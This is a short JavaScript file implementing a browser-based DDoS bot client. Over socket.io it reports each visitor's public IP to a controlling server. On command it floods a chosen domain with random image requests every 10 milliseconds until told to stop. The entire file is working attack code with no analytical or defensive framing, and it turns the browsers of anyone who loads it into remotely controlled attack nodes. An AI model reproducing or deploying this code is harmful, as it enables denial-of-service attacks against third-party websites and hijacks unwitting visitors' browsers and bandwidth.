var socket = io();

socket.on('connect', async function() {
	async function getIp() { 
    		const req = await fetch('https://ipapi.co/json/');
    		const res = await req.json();
    		// send the IP to server

    		var ip = JSON.stringify(res.ip);
    		
    		return ip
	}
	
	var ip = await getIp();
	// replace trailing "" marks
	ip = ip.replace(/^"(.+(?="$))"$/, '$1');
	
	socket.emit('join', {name: ip});
}); 

var ddos;

socket.on('start', function(data) {
	try {
	var domain = JSON.stringify(data.data).replace(/^"(.+(?="$))"$/, '$1');;

	ddos = setInterval(function() {
		var pic = new Image()
  		var rand = Math.floor(Math.random() * 1000)
  		pic.src = domain+"/"+rand+'.png'
	}, 10);
	}catch (e) {
		// do nothing
	}
});

socket.on('stop', function() {
	clearInterval(ddos);
});